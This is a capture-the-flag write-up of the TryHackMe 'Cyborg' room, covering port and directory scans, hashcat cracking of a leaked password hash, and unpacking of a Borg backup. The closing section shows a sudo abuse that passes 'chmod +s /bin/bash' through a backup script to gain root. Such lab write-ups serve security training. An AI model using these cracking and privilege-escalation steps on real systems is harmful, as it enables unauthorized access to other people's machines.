## Cyborg
https://tryhackme.com/room/cyborgt8

### :ramen: Enum
いつもの... 
```
nmap -Pn -sC -sV -T4 -A 10.10.58.35 
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/12%OT=22%CT=1%CU=40327%PV=Y%DS=4%DC=T%G=Y%TM=62CD22C
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 14.663 days (since Tue Jun 28 00:34:07 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ffuf -u http://10.10.58.35/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r
```

```
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.58.35/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 474ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 482ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 507ms]
admin                   [Status: 200, Size: 5771, Words: 1870, Lines: 139, Duration: 443ms]
etc                     [Status: 200, Size: 926, Words: 64, Lines: 17, Duration: 434ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 446ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 456ms]
:: Progress: [4712/4712] :: Job [1/1] :: 91 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/6504854/178483731-e1a8948c-4759-4211-85db-4e921bbd7dd8.png)
![image](https://user-images.githubusercontent.com/6504854/178484188-066ba36e-2c38-4514-9ddd-068bcd0f16ae.png)
![image](https://user-images.githubusercontent.com/6504854/178484248-1afca37e-2c8a-4e3f-9e07-0dde9a2b9bf7.png)
![image](https://user-images.githubusercontent.com/6504854/178484313-e5b3e694-5dd1-4d50-9b46-51f63f79bb6f.png)

https://hashcat.net/wiki/doku.php?id=example_hashes

![image](https://user-images.githubusercontent.com/6504854/178485092-25af3968-4763-42ee-a773-8686db6cfd58.png)

```
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > h1.txt
hashcat -m 1600 h1.txt /usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/6504854/178485412-43341386-5cb0-4282-8ca5-03b1b454c2b1.png)

We can dl archive.tar admin page and extract.

```
cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

```
strings index.5
BORG_IDXd
%J_I
FDB9
```

```
borg list final_archive
Enter passphrase for key home/field/dev/final_archive:
music_archive                        Tue, 2020-12-29 23:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

```
borg extract ./final_archive::music_archive
Enter passphrase for key home/field/dev/final_archive:
```
https://borgbackup.readthedocs.io/en/stable/usage/extract.html

🏴 Now we got alex's pass from his archive.


### :ramen: Flag
```
ssh alex@10.10.58.35
alex@ubuntu:~$ cat user.txt
flag{*_****_***_****_***_*****_****}
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c 'chmod +s /bin/bash'
alex@ubuntu:~$ /bin/bash
bash-4.3# cat /root/root.txt
flag{*****_***_*******_****_***_*******}
```

😄Thank you for your time. Enjoy!
